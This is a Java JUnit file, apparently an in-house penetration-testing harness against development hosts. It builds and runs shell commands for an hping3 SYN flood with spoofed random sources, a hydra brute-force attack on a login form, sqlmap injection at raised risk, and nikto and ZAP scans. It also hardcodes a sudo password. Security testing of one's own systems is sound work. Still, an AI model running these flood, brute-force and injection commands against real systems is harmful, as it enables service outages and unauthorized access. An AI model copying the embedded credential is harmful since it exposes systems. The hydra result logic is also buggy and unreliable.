package com.penetration.testing;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.XML;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.net.InetAddress;
import java.time.LocalDate;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.Calendar;

class Tests {

    private static FileWriter file;
@Test
    public void testZero() throws IOException, InterruptedException {
        System.out.println("=========================================================================================================");
        System.out.println("=========================================================================================================");
        JSONObject obj = new JSONObject();

        obj.put("Dos", Dos("local-tt.dev-machinestalk.com"));
        int spacesToIndentEachLevel = 2;
        String rst= new JSONObject(obj.toString()).toString(spacesToIndentEachLevel);
        String path="index.html";
        PrintWriter writer = new PrintWriter(path, "UTF-8");
        writer.println("<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n" +
                "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n" +
                "    <title>Document</title>\n" +
                "    <link rel=\"stylesheet\" href=\"style.css\">\n" +
                "\n" +
                "</head>\n" +
                "<body>\n" +
                "    <h1 id=\"myTitle\" class=\"test\">hello workld</h1>\n" +
                "    <button id=\"myButton\">click me</button>\n" +
                "</body>\n" +
                "<script >\n" +
                "let button=document.getElementById(\"myButton\");\n" +
                "let title=document.getElementById(\"myTitle\");\n" +
                "\n" +
                "console.log(button.innerHTML);\n" +
                "button.addEventListener(\"click\",function test() {\n" +
                "    title.style.color=\"red\";\n" +
                "    \n" +
                "})\n" +
                "</script>\n" +
                "</html>");
        writer.close();
//    obj.put("Brute Force Attack", hydraScan());
//    obj.put("Nikto scan",niktoScan());
//    obj.put("SQLMAP", SQLMapScan("http://local-iam.dev-machinestalk.com/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/protocol/openid-connect/auth?response_type=code&client_id=thingstalk&scope=email%20openid%20profile&state=4xsrWMTDw4SW6yPF8TyfOTZs0ZHZb2G9mLee55jahNE%3D&redirect_uri=http://local-tt.dev-machinestalk.com/login/oauth2/code/&nonce=QEag5SgTJ7uZFpy358sgwTGqY4ASnMoazLBmPkzYnXA","username=hello&password=hello%3A%29",1));
//    obj.put("Zap scan",zapScan());

    System.out.println("=========================================================================================================");
    System.out.println("=========================================================================================================");

    }


    public static JSONObject hydraScan() throws IOException, InterruptedException {
        System.out.println("hydra scan is running");

        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand ="hydra -L /home/ahmed/Desktop/Login_Usernames -P /home/ahmed/Desktop/Login_Passwords local-iam.dev-machinestalk.com http-post-form \"/auth/realms/30d74b00-c16b-11ec-b363-df9b89c1f66c/login-actions/authenticate?session_code=BFX_Z-jkHIUg1eSCSzad7QwtvxP2TkGYG1AqWycxXTo&execution=11e34933-e64e-417e-88ff-8ab1ec2847c5&client_id=thingstalk&tab_id=WxWenBoK8WQ:username=^USER^&password=^PASS^:S=\" -vV -f";
        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});
        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        boolean logged_in=false;
        while ((s = br.readLine()) != null){
//            System.out.println(s);
            if (s.contains("1 valid password found")){
                logged_in=false;
            }
        }
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj2.put("Logged in",logged_in);
        int spacesToIndentEachLevel = 2;
        p.waitFor();
        p.destroy();
        return obj2;
    }

    public static JSONObject zapScan() throws IOException, InterruptedException {
        System.out.println("zap scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "./zap.sh -daemon -quickurl http://local-tt.dev-machinestalk.com/";

        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        String result="";
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        boolean save=false;
        boolean loop=true;
        while (loop){
            s= br.readLine();
            if (s.contains("<?xml version")){
                save=true;
            }
            if (s.contains("</OWASPZAPReport>")){
                result+=s;
                loop=false;
                save=false;
            }
            if (save){
                result+=s;
            }
        }
//        p.waitFor();
//        p.destroy();
        String xml=result;
        JSONObject json = XML.toJSONObject(xml);
        String jsonString = json.toString(4);
        p.destroy();
        return json;
    }
    public static JSONObject SQLMapScan(String url,String data,int level) throws IOException, InterruptedException {
        System.out.println("sqlmap is running");

        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "sqlmap -u '"+url+"' --data '"+data+"' --level "+level+" --risk "+level+" --ignore-stdin";
        ProcessBuilder pb = new ProcessBuilder(
                new String[] {prefix, c, terminalCommand});

        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;

        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));

        JSONArray info = new JSONArray();
        JSONArray critical = new JSONArray();
        JSONArray warning = new JSONArray();
        Boolean injectable=true;

        while ((s = br.readLine()) != null){
            if (s.contains("INFO")){
                info.put(s.substring(s.indexOf("[INFO]")+"[INFO] ".length()));
            }
            if (s.contains("WARNING")){
                warning.put(s.substring(s.indexOf("[WARNING]")+"[WARNING] ".length()));
            }
            if (s.contains("CRITICAL")){
                if (s.contains("all tested parameters do not appear to be injectable")){
                    injectable=false;
                    critical.put(s.substring(s.indexOf("[CRITICAL]")+"[CRITICAL] ".length(),s.indexOf(". Try to increase")));
                    continue;
                }
                critical.put(s.substring(s.indexOf("[CRITICAL]")+"[CRITICAL] ".length()));

            }
        }
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj.put("info", info);
        obj.put("critical", critical);
        obj.put("warning", warning);
        obj.put("injectable", injectable);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject niktoScan() throws IOException, InterruptedException {
        System.out.println("nikto scan is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "nikto -h http://local-tt.dev-machinestalk.com";
        ProcessBuilder pb = new ProcessBuilder(
                new String[]{prefix, c, terminalCommand});
        File workingDirectory = new File("/home/ahmed/Downloads/ZAP_2.11.1");
        pb.directory(workingDirectory);
        Process p = pb.start();
        String s;
        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        JSONArray vulsArray = null;
        vulsArray = new JSONArray();
        String elapsedTime="";
        while ((s = br.readLine()) != null) {
            if (s.startsWith("+ OSVDB")) {
                JSONObject vulJson = new JSONObject();
                String str=s.substring(s.indexOf(":")+2);
                vulJson.put("Vulnerability name",s.substring(s.indexOf("OSVDB"),s.indexOf(":")));
                vulJson.put("Description", str.substring(str.indexOf(":")+2));
                vulJson.put("Test link name","http://local-tt.dev-machinestalk.com:80"+str.substring(str.indexOf("/"),str.indexOf(":")) );
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ /")){
                JSONObject vulJson = new JSONObject();
                vulJson.put("vulnerability name","OSVDB-0");
                vulJson.put("description", s.substring(s.indexOf(":")+2));
                vulJson.put("test link","http://local-tt.dev-machinestalk.com:80"+s.substring(s.indexOf("/"),s.indexOf(":")) );
                vulsArray.put(vulJson);
            }
            if (s.startsWith("+ End Time: ")){
                elapsedTime=s.substring(s.indexOf("seconds")-3,s.indexOf("seconds")+"seconds".length());
            }



        }
        obj.put("vunerabilities", vulsArray);
        obj.put("Elapsed Time",elapsedTime);
        obj2.put("Nikto scan",obj);
        p.waitFor();
        p.destroy();
        return obj;
    }

    public static JSONObject Dos(String url) throws IOException, InterruptedException {
        System.out.println("dos attack is running");
        String prefix = "/bin/bash";
        String c = "-c";
        String terminalCommand = "sudo -S <<< \"23474629\" hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source -host "+ url;
        ProcessBuilder pb = new ProcessBuilder(new String[] {prefix, c, terminalCommand});
        File workingDirectory = new File("/home");
        pb.directory(workingDirectory);
        Process p = pb.start();
        Thread.sleep(3000);
        JSONObject obj = new JSONObject();
        JSONObject obj2 = new JSONObject();
        obj2.put("result",!InetAddress.getByName(url).isReachable(20));
        obj.put("Dos attack", obj2);
        p.destroy();
        return obj2;
    }
}